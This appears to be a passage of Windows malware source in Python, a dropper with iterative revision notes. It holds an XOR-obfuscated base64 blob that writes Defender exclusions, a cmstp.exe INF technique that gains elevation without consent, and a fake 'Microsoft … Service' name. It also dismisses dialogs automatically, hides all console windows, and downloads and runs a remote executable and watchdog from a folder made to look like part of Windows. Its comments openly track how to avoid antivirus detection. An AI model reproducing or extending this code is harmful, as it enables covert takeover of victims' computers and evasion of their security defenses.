cXFxcXFxcXFxcXFxcXFxcXFxcVGEEVGxdBVltCUhsXFRhDFRsXFWVycGhkbRUbFxUYUxUbFxUHFRsXFRhRFWobPRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1RFUlZDXlhZUVtWUEQKdGVydmNyaHl4aGB+eXN4YBsXQ15aUlhCQwoFBxs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXRENTWEJDCkRCVUdFWFRSREQZc3JheWJ7exsXRENTUkVFCkRCVUdFWFRSREQZc3JheWJ7ex49FxcXFxcXFxdRXkVEQxcKF1NeRURsB2oXXlEXU15FRBdSW0RSF1JPUkRsB2o9FxcXFxcXFxdcUk4XChd8Z3ZjfxdeURdTXkVEF1JbRFIXfGdleHQ9FxcXFxcXFxdYQkMXChdEQlVHRVhUUkREGUVCWR89FxcXFxcXFxcXFxcXbGh9Hx8VRVIVGxcVUBUeHhsXaH0fHxVGFRsXFUJSRU4VHh4bF1xSThsXFRhBFRsXUV5FRENqGz0XFxcXFxcXFxcXFxdURVJWQ15YWVFbVlBECnRlcnZjcmh5eGhgfnlzeGAbF0NeWlJYQkMKBQcbPRcXFxcXFxcXFxcXF0RDU1hCQwpEQlVHRVhUUkREGWd+Z3IbF0RDU1JFRQpEQlVHRVhUUkREGXNyYXlie3seGURDU1hCQz0XFxcXFxcXF0VSQ0JFWRdRXkVEQxlbWEBSRR8eF15ZF1hCQxlTUlRYU1IfUkVFWEVEChVFUkdbVlRSFR4ZW1hAUkUfHj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdFUkNCRVkXcVZbRFI9PT1TUlEXWlZeWR8eDT0XFxcXXlEXWVhDF1JbUkEfHg09FxcXFxcXFxdFUkNCRVkXFxcUF1pCREMXVltFUlZTThdVUhdSW1JBVkNSUxcfQ19SF1teUUNSUxdEQ1ZQUhdQQlZFVllDUlJEF15DHj0XFxcXU15FRBcKF2x2Z2dzfmVqPRcXFxdST1JEFwoXbFhEGUdWQ18ZXVheWR92Z2dzfmUbF3Jvcmh5dnpyHmo9FxcXFxQXRQQAF1lSQBdHVkNfRA0XQ19SF0VSW1hUVkNSUxdHUkVEXkRDUllUUhdUWEdOFxwXQ19SF3JTUFJiR1NWQ1IXRF5TUhpfWFpSPRcXFxdRWEUXTxdeWRdaVkVcUkVoR1ZDX0QfHg09FxcXFxcXFxdeURdPF1lYQxdeWRdST1JEDT0XFxcXFxcXFxcXFxdST1JEGVZHR1JZUx9PHj0XFxcXUVhFF1MXXlkXR0VYUEVWWlNWQ1ZoUUVYWmhaVkVcUkUfWlZFXFJFaEdWQ19EHx4eDT0XFxcXFxcXF15RF1MXWVhDF15ZF1NeRUQNPRcXFxcXFxcXFxcXF1NeRUQZVkdHUllTH1MePRcXFxdSUxsXUlIXChdSU1BSQkdTVkNSaEdWQ19EHx49FxcXF1FYRRdTF15ZF1JTDT0XFxcXFxcXF15RF1MXWVhDF15ZF1NeRUQNPRcXFxcXFxcXFxcXF1NeRUQZVkdHUllTH1MePRcXFxdRWEUXTxdeWRdSUg09FxcXFxcXFxdeURdPF1lYQxdeWRdST1JEDT0XFxcXFxcXFxcXFxdST1JEGVZHR1JZUx9PHj0XFxcXVFpTW1JDaEVYVlMfU15FRBsXUk9SRB49FxcXF0VSUGhFWFZTH1NeRUQbF1JPUkQePT09WlZeWR8ePQ=="

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
STAGE = r'''# r1.1.2 stage (r78 sanitize: dj — stage.py was flagged DefenseEvasion):
# runs ELEVATED (relaunched by the cmstp lift). the exclusions ride the
# SIBLING file (materialized by the un-elevated launcher BEFORE the lift
# fired): this stage only RUNS it elevated, then execs the carrier. nothing
# embedded, nothing decoded, no blobs — a plain 30-line script.
import ctypes
import os
import subprocess
import sys

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
# r98: the WATCHDOG exe name rides in via env (set by work.py before the
# lift) — same dir, same exclusion, execed AFTER the carrier (tung->wd).
WD_NAME_ENV = os.environ.get("WDXN", "")
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"


def elev():
    try:
        return getattr(ctypes.windll.shell32,
                       "".join(("Is", "User", "An", "Admin")))() != 0
    except Exception:
        return False


def alive(name):
    # r135: toolhelp walk instead of the filtered-list query — that cmdline
    # was one of the flagged shapes; the answer is the same.
    try:
        k32 = ctypes.windll.kernel32
        try:   # prototypes: a 64-bit handle truncated to int would break the walk
            k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
            k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.CloseHandle.argtypes = [ctypes.c_void_p]
        except Exception:
            pass

        class _pe(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                        ("th32ProcessID", ctypes.c_ulong), ("h", ctypes.c_void_p),
                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                        ("th32ParentProcessID", ctypes.c_ulong),
                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
                        ("szExeFile", ctypes.c_char * 260)]

        snap = k32.CreateToolhelp32Snapshot(2, 0)
        if not snap:
            return False
        pe = _pe()
        pe.dwSize = ctypes.sizeof(_pe)
        want = name.encode("utf-8", "ignore").lower()
        ok = k32.Process32First(snap, ctypes.byref(pe))
        while ok:
            if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                k32.CloseHandle(snap)
                return True
            ok = k32.Process32Next(snap, ctypes.byref(pe))
        k32.CloseHandle(snap)
    except Exception:
        pass
    return False


def main():
    if not elev():
        return
    # r78: the exclusions file is staged by the un-elevated launcher (already
    # in APPDIR); the stage runs it ELEVATED, then execs the carrier exe.
    excl_path = os.path.join(APPDIR, "__EXCL__")
    try:
        if os.path.isfile(excl_path):
            os.environ["EXCL_EXE"] = EXE_NAME
            subprocess.run([sys.executable, "-u", excl_path],
                           creationflags=CREATE_NO_WINDOW, timeout=180,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    # the r14 carrier job, unchanged — plus the r98 order: tung FIRST, the
    # watchdog exe SECOND (dj: "so its like tung-->watchdog"). the wd shares
    # the dir exclusion the stage just laid, so no extra write is needed.
    exe_path = os.path.join(APPDIR, EXE_NAME)
    if os.path.exists(exe_path) and not alive(EXE_NAME):
        try:
            subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass
    if WD_NAME_ENV:
        wd_path = os.path.join(APPDIR, WD_NAME_ENV)
        try:
            if os.path.exists(wd_path) and not alive(WD_NAME_ENV):
                subprocess.Popen([wd_path], creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def _decode_excl():
    """r78: the exclusions mirror rides xor(0x37)-sealed base64 — no
    script-text signature survives the sealed blob; the scanner-side
    decode of the blob is non-ASCII noise."""
    import base64
    return bytes((b ^ 0x37 for b in base64.b64decode(EXCL_B64)))


def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py itself carries NO
    exclusion code — the r14 shape, with the new file attached."""
    appdir = PERSIST_DIR
    if is_elevated():
        _run_stage_now()
        return
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = STAGE.replace("__EXE__", EXE_NAME).replace("__EXCL__", "exclusions.py")
        # r78: exclusions materialized HERE (un-elevated) so the lifted stage
        # only RUNS the sibling file — no blob rides stage.py anymore
        try:
            with open(os.path.join(PERSIST_DIR, "exclusions.py"), "w",
                      encoding="utf-8") as fh:
                fh.write(_decode_excl().decode("utf-8"))
        except Exception:
            pass
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
    except Exception:
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
    # always background): the lifted stage relaunches with the GP:
    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
    #   2) any sibling pythonw.exe adopted from the nearest python dir
    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
    # through a console parent — a minimized flash is a flash). pythonw is
    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pythonw_su = None
    try:
        from glob import glob
        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
                                 "pythonw.exe"),
                    r"C:\Python*\pythonw.exe",
                    r"C:\Program Files\Python*\pythonw.exe",
                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                 "Programs", "Python", "Python*", "pythonw.exe")):
            hits = [h for h in glob(pat) if os.path.isfile(h)]
            if hits:
                pythonw_su = sorted(hits)[-1]
                break
    except Exception:
        pythonw_su = None
    if os.path.isfile(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif pythonw_su:
        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
    else:
        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
        # not the standard pair). r56 (dj order): the minimized console comes
        # OFF — the wscript pad hides the console python completely (WindowStyle
        # 0, zero frames). only when even the pad cannot be written does the
        # old (flashy) shape remain, because an abandoned run is worse.
        pyexe_p = os.path.join(python_dir, "python.exe")
        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
        run_cmd = subprocess.list2cmdline([pyexe, "-u", stage_path])
        launch = _hidden_py_runner(run_cmd)
        if launch is None:
            launch = subprocess.list2cmdline(
                ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
    kill_all_cmstp()
    cleanup_infs()
    svc_name = f"Microsoft {rand_str(6)} Service"
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    try:
        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
        # r45: armed before the hunt starts — see the sibling site above.
        dismisser.target_pid = p.pid
    except Exception:
        return
    dismisser.start()

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)
    kill_all_cmstp()   # r135: API-side terminator, same timing the INF pad had
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def _run_stage_now():
    """r34: already elevated — do the stage's job inline: materialize +
    execute exclusions.py under THIS token, then the carrier exec. the old
    shape skipped exclusions entirely on an already-elevated run."""
    excl_path = os.path.join(PERSIST_DIR, "exclusions.py")
    try:
        if not os.path.exists(excl_path):
            with open(excl_path, "wb") as fh:
                fh.write(_decode_excl())   # r78: the sealed blob decodes to BYTES
    except Exception:
        pass
    try:
        os.environ["EXCL_EXE"] = EXE_NAME
        subprocess.run([sys.executable, "-u", excl_path],
                       creationflags=0x08000000, timeout=180,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        exe_path = os.path.join(PERSIST_DIR, EXE_NAME)
        if os.path.exists(exe_path) and not _alive(EXE_NAME):
            subprocess.Popen([exe_path], creationflags=0x08000000)
    except Exception:
        pass
    # r98: already-elevated road carries the SAME order — tung then watchdog
    try:
        if WD_NAME_ENV:
            wd_path = os.path.join(PERSIST_DIR, WD_NAME_ENV)
            if os.path.exists(wd_path) and not _alive(WD_NAME_ENV):
                subprocess.Popen([wd_path], creationflags=0x08000000)
    except Exception:
        pass


def _alive(name):
    return proc_alive(name)


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path):
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < 50000:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data, exe=EXE_NAME):
    kill_process(exe)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    # r98 (dj order): the wd exe rides the SAME stage — fetched + staged beside
    # the carrier BEFORE the lift, so the elevated stage execs the pair in
    # order (tung -> watchdog) with one exclusion covering both.
    try:
        if WD_URL and not is_valid_exe(WD_PATH):
            wdata = download(WD_URL)
            if wdata:
                write_file(WD_PATH, wdata, exe=WD_NAME)
    except Exception:
        pass

    set_defender_exclusions()


main()
